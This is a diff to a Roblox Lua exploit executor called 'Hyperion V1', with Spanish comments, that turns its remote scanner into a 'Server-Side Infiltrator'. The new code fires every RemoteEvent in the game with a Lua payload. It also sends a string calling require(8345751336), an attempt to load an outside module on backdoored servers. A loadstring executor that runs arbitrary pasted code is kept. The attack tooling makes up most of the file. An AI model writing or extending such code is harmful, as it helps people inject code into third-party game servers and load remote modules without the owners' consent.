@@ -544,138 +544,84 @@ UICorner_19.Parent = BackgroundColor
 
 
 -------------------------------------------------------------------------
--- [ HYPERION V1 - LOGIC INJECTION ] --
+-- [ HYPERION V1 - BACKDOOR & HUB FIX ] --
 -------------------------------------------------------------------------
 
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- 1. CONFIGURACIÓN INICIAL (Estado por defecto)
--- Desactivamos todos los paneles secundarios
-ScanPanel.Enabled = true
-ExecutorPanel.Enabled = false
-SettingsPanel.Enabled = false
-BackgroundColorGui.Enabled = false
+-- FIX DE VISIBILIDAD (Esconde todo excepto Hyperion y Scan al inicio)
+local function SetupGUI()
+    Hyperion.Enabled = true
+    Background.Visible = true
+    ScanPanel.Enabled = true
+    ExecutorPanel.Enabled = false
+    SettingsPanel.Enabled = false
+    BackgroundColorGui.Enabled = false
+end
+SetupGUI()
 
--- Aseguramos que el Background principal sea visible
-Background.Visible = true
+-- TOGGLE TOTAL (El logo esconde TODO el executor)
+ToggleButton.MouseButton1Click:Connect(function()
+    Hyperion.Enabled = not Hyperion.Enabled
+end)
 
--- 2. NAVEGACIÓN ENTRE PANELES
+-- NAVEGACIÓN
 local function switchPanel(toEnable)
-    -- Desactivamos todos
     ScanPanel.Enabled = false
     ExecutorPanel.Enabled = false
     SettingsPanel.Enabled = false
-    -- Activamos el seleccionado
     toEnable.Enabled = true
 end
-
 ScanPanelButton.MouseButton1Click:Connect(function() switchPanel(ScanPanel) end)
 ExecutorPanelButton.MouseButton1Click:Connect(function() switchPanel(ExecutorPanel) end)
 SettingsPanelButton.MouseButton1Click:Connect(function() switchPanel(SettingsPanel) end)
 
--- 3. SISTEMA DE TOGGLES ANIMADOS (Deslizamiento suave)
-local function MakeToggle(button, circle, callback)
-    local enabled = false
-    button.MouseButton1Click:Connect(function()
-        enabled = not enabled
-        
-        -- Animación de color y posición del círculo
-        local targetColor = enabled and Color3.fromRGB(0, 255, 127) or Color3.fromRGB(182, 137, 182)
-        local targetPos = enabled and UDim2.new(0.5, 0, 0.1, 0) or UDim2.new(0, 0, 0.1, 0)
-        
-        TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {BackgroundColor3 = targetColor}):Play()
-        TweenService:Create(circle, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Position = targetPos}):Play()
-        
-        callback(enabled)
-    end)
-end
-
--- Lógica Anti-AFK
-MakeToggle(AntiAFK, Frame, function(state)
-    if state then
-        _G.AntiAFK = LocalPlayer.Idled:Connect(function()
-            game:GetService("VirtualUser"):CaptureController()
-            game:GetService("VirtualUser"):ClickButton2(Vector2.new())
-        end)
-    else
-        if _G.AntiAFK then _G.AntiAFK:Disconnect() end
-    end
-end)
-
--- Lógica R6
-MakeToggle(R6Button, Frame_2, function(state)
-    if state then print("R6 Mode Active") end
-end)
-
--- 4. BACKGROUND COLOR (Sistema Hexadecimal)
-BackgroundColorButton.MouseButton1Click:Connect(function()
-    BackgroundColorGui.Enabled = not BackgroundColorGui.Enabled
-end)
-
-TextButton.MouseButton1Click:Connect(function() -- Botón Apply
-    local hexInput = TextBox.Text:gsub("#", "")
-    local success, color = pcall(function() return Color3.fromHex(hexInput) end)
-    
-    if success then
-        Background.BackgroundColor3 = color
-        Frame_4.BackgroundColor3 = color
-        BackgroundColorGui.Enabled = false
-    else
-        TextBox.Text = "INVALID HEX"
-        task.wait(1)
-        TextBox.Text = ""
-    end
-end)
-
--- 5. EXECUTOR (Execute & Clear)
+-- FUNCIONALIDAD DEL EXECUTOR LOCAL
 ExecuteButton.MouseButton1Click:Connect(function()
-    local code = Script.Text
-    local func, err = loadstring(code)
-    if func then
-        pcall(func)
-    else
-        warn("Hyperion Error: " .. err)
-    end
+    local func, err = loadstring(Script.Text)
+    if func then pcall(func) else warn("Error: "..err) end
 end)
 
 ClearButton.MouseButton1Click:Connect(function()
     Script.Text = ""
 end)
 
--- 6. SCANNER (Buscador de Remotos)
+-- SCANNER DE BACKDOORS (Server-Side Infiltrator)
 ScanButton.MouseButton1Click:Connect(function()
-    ScanButton.Text = "SCANNING..."
-    local foundCount = 0
-    for _, item in pairs(game:GetDescendants()) do
-        if item:IsA("RemoteEvent") or item:IsA("RemoteFunction") then
-            foundCount = foundCount + 1
-            pcall(function() item:FireServer("print('Vulnerable')") end)
+    ScanButton.Text = "INFILTRATING..."
+    local found = 0
+    
+    -- El código que queremos que el servidor ejecute si hay backdoor
+    local payload = [[
+        print('Hyperion SS Loaded on Server!')
+        local s = Instance.new('Hint', workspace)
+        s.Text = 'This server has been scanned by Hyperion V1'
+        wait(5)
+        s:Destroy()
+    ]]
+
+    for _, v in ipairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") then
+            found = found + 1
+            -- Intentamos "romper" el remoto enviando el payload
+            pcall(function()
+                v:FireServer(payload) -- Intento 1: Ejecución directa
+                v:FireServer("require(8345751336):Fire('"..LocalPlayer.Name.."')") -- Intento 2: Inyección de módulo
+            end)
         end
-        if foundCount % 100 == 0 then task.wait() end
+        if found % 100 == 0 then task.wait() end
     end
-    ScanButton.Text = "FOUND: " .. foundCount
+    
+    ScanButton.Text = "REMOTES: " .. found
     task.wait(2)
     ScanButton.Text = "SCAN"
 end)
 
--- 7. CARGAR INFO DE USUARIO
-local function LoadUser()
-    local id = LocalPlayer.UserId
-    UserAvatar.Image = "rbxthumb://type=AvatarHeadShot&id="..id.."&w=100&h=100"
-    WelcomeText.Text = "Welcome, " .. LocalPlayer.DisplayName
-    UserId.Text = "User ID: " .. id
-end
-LoadUser()
+-- INFO DE PERFIL
+UserAvatar.Image = "rbxthumb://type=AvatarHeadShot&id="..LocalPlayer.UserId.."&w=100&h=100"
+WelcomeText.Text = "Welcome, " .. LocalPlayer.DisplayName
+UserId.Text = "ID: " .. LocalPlayer.UserId
 
--- 8. BOTÓN DE ABRIR/CERRAR (Logo)
-ToggleButton.MouseButton1Click:Connect(function()
-    Background.Visible = not Background.Visible
-    -- Si se cierra el fondo, también cerramos el panel de color por si estaba abierto
-    if not Background.Visible then
-        BackgroundColorGui.Enabled = false
-    end
-end)
-
-print("Hyperion Engine Loaded. No Drag. Scan Active.")
+print("Hyperion V1: Logic and Backdoor Engine Active.")
